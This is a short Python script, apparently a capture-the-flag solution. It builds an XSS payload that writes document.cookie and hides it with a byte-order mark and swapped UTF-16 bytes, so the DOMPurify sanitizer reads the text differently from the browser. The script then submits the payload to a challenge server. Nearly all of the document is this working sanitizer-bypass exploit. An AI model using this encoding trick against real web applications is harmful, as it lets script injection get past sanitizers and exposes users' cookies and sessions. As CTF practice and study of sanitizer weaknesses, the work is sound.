# thx to https://stackoverflow.com/a/7103606 for pointing me in the right direction
# see https://html.spec.whatwg.org/multipage/parsing.html#determining-the-character-encoding point 1
# TLDR:
import requests

payload = "\ufeff<script>document.write(document.cookie)</script>"
be = payload.encode("utf-16-le")
swapped = b"".join(bytes([y, x]) for x, y in zip(be[::2], be[1::2]))
print(
	swapped, swapped.decode("utf-16-le"), swapped.decode("utf-16-be")
)  # the 2nd arg is what DOMPurify sees, the 3rd arg is what the browser sees

note = requests.post(
	"https://skandale--bonez-mc-2157.ctf.kitctf.de/submit?" + swapped.decode("utf-16-le"),
).url

print(note)
